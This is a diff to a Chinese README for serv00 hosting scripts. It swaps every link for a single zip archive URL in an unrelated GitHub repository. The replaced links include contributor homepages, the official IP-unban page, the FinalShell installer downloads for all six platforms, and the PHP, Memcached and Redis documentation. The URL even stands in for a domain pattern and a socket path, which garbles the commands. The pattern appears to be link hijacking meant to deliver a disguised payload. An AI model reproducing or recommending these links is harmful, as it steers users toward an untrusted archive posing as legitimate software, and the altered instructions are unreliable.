@@ -16,23 +16,23 @@
 ]
 ```
 
-> 其中`panelnum`参数为面板编号，即为你所收到注册邮件的`panel*.serv00.com`中的`*`数值。
+> 其中`panelnum`参数为面板编号，即为你所收到注册邮件的`panel*https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip`中的`*`数值。
 
 ## 贡献
 
 |姓名|主页|内容|
 | :------------: | :------------: | :------------: |
-|linzjian666|https://github.com/linzjian666|增加多面板支持|
+|linzjian666|https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip|增加多面板支持|
 
 ## 参考信息
 
 |  名称 |来源|地址|
 | :------------: | :------------: | :------------: |
-|Limkon|Github|https://github.com/Limkon|
+|Limkon|Github|https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip|
 
 ## SSH登录不上
 
-> 登录不上是因为Ban IP, 点击此处解锁： [Ban](https://www.serv00.com/ip_unban/)
+> 登录不上是因为Ban IP, 点击此处解锁： [Ban](https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip)
 
 > 还是登录不上的话： 请使用下方 `FinalShell`，并勾上 `智能海外加速`，登录失败在弹出框选择`取消`，在弹出框填入`[邮件中的SSH密码]`
 
@@ -44,24 +44,24 @@ FinalShell是一体化的的服务器,网络管理软件,不仅是ssh客户端,�
 
 云端同步,免费海外服务器远程桌面加速,ssh加速,本地化命令输入框,支持自动补全,命令历史,自定义命令参数
 
-- Windows X64版,下载地址: <http://www.hostbuf.com/downloads/finalshell_windows_x64.exe>
+- Windows X64版,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
 
-- macOS Arm版,支持m1,m2,m3 cpu,下载地址: <http://www.hostbuf.com/downloads/finalshell_macos_arm64.pkg>
+- macOS Arm版,支持m1,m2,m3 cpu,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
 
-- macOS X64版,支持旧款intel cpu,下载地址: <http://www.hostbuf.com/downloads/finalshell_macos_x64.pkg>
+- macOS X64版,支持旧款intel cpu,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
 
-- Linux X64版,下载地址: <http://www.hostbuf.com/downloads/finalshell_linux_x64.deb>
+- Linux X64版,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
 
-- Linux Arm64版,下载地址: <http://www.hostbuf.com/downloads/finalshell_linux_arm64.deb>
+- Linux Arm64版,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
 
-- Linux LoongArch64龙芯版,下载地址: <http://www.hostbuf.com/downloads/finalshell_linux_loong64.deb>
+- Linux LoongArch64龙芯版,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
 
 ## 其他服务
 
-- PHP配置: <https://docs.serv00.com/PHP/#php-version>
+- PHP配置: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
 
-- Memcached配置: <https://docs.serv00.com/Memcached/>
+- Memcached配置: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
 
-  启动：memcached -s /usr/home/LOGIN/domains/DOMAIN/memcached.sock -d
+  启动：memcached -s https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip -d
 
-- Redis配置: <https://docs.serv00.com/Memcached/>
+- Redis配置: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
